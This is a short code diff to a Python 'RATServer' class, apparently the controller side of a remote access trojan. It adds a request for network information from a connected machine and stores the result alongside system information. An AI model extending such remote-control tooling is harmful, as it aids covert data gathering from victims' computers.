@@ -165,10 +165,16 @@ class RATServer(metaclass=SingletonMeta):
 
             system_info = self.receive_output(socket_ip)
             system_info = json.loads(system_info)
+
+            # Network Information
+            socket_client.send(json.dumps({"type": "information", "part": "network_info"}).encode())
+            network_info = self.receive_output(socket_ip)
+            network_info = json.loads(network_info)
             
             # Continue with the connection and gather data
             data = {
-                "System Info": system_info["data"]
+                "System Info": system_info["data"],
+                "Network Info": network_info["data"]
                 # Add more data retrieval commands here
             }
             
